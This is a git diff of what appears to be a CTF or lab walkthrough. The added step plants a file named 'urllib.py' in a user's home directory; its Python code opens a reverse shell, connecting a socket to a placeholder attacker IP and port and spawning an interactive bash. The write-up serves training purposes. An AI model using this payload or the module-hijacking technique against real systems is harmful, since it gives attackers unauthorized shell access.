@@ -1362,5 +1362,20 @@ Nmap done: 10 IP addresses (10 hosts up) scanned in 946.96 seconds
 
 <img width="1262" height="103" alt="image" src="https://github.com/user-attachments/assets/55d55083-3b16-43af-8bcc-e0955721182b" />
 
-38. We'll create a malicious python file that gives us a reverse shell in the `/home/frank` directory
+38. We'll create a malicious python file that gives us a reverse shell in the `/home/frank` directory. We'll create a `urllib.py` file with the following contents:
 
+```
+#!/usr/bin/python3
+from os import dup2
+from subprocess import run
+import socket
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("[LOCAL_IP]",[PORT])) 
+dup2(s.fileno(),0) 
+dup2(s.fileno(),1) 
+dup2(s.fileno(),2) 
+run(["/bin/bash","-i"])
+```
+
+39. 
